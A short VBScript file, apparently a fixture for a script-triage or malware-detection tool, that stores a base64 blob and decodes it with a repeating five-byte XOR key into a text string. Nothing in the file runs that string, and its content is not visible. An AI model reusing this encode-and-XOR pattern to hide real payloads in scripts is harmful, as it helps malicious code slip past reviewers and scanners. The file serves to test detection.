Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_2a1169cf = "qhGXhDaoSdaLeL1P140srkn5iiCxQ9Kdaatez4wgg0rPlCDwSM+LNb1YxZAarF7JmyCvX4qQJLJIyZ4jg1/FiiysWNqZIb1c0p034WH1oAiQHoigCJBk8qwV8hqIyDmvWMefIINPyY0rqBGShCa9QdaZLLtC+ZEh4U/HlTW9RcGWaOgbwJ4huR6UmiGgWdSUeLRY0og25gOJzHK6SsKdd+5OwtYgpE3LiCm5As+WM71Az5xq6xzEwCe6SJ7WIb1Y2o02uV75mSK5QtLFDalC0oogr1/qmSfzGJGeI7hJlMonuFDAkSm5c9aZMbQR5cIZiV/DijaAfNOaKbVP+rAwsljUnTavYMeaGa9Yx58g8RiRniO4SZTKJ7gCwpkxoF7DnyyvWNSBGqxN0pB4lGflrRmPQ8CMMr1ew6QNqULSiiCvX+qZJ4Boz4s1s1/Hmim5cJLPI7pIw8p3vkjaliCkWPmLMb1Lw8Ups0/HlGi4RdWIJKhPztYzvl8="
Const Codec_2a1169cf = "base64_literal|repeating_key_xor|dc,2c,a6,f8,45"

Function Base64_2a1169cf(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_2a1169cf", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_2a1169cf = outputBytes
End Function

Function Load_2a1169cf()
  Load_2a1169cf = Base64_2a1169cf(Material_2a1169cf)
End Function

Function Decode_2a1169cf(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  keyBytes = Array(220,44,166,248,69)
  For i = 0 To UBound(s)
    result(i) = s(i) Xor keyBytes(i Mod 5)
  Next
  Decode_2a1169cf = result
End Function

Function Recover_2a1169cf()
  Dim s, d, t, n, i, p, e, q
  If (2 > 1) Then n = "left" Else n = "right"

  s = Load_2a1169cf()

  Do

    d = Decode_2a1169cf(s)

    Exit Do

  Loop

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_2a1169cf = t
End Function

Function Inspect_2a1169cf()
  Inspect_2a1169cf = Recover_2a1169cf()
End Function
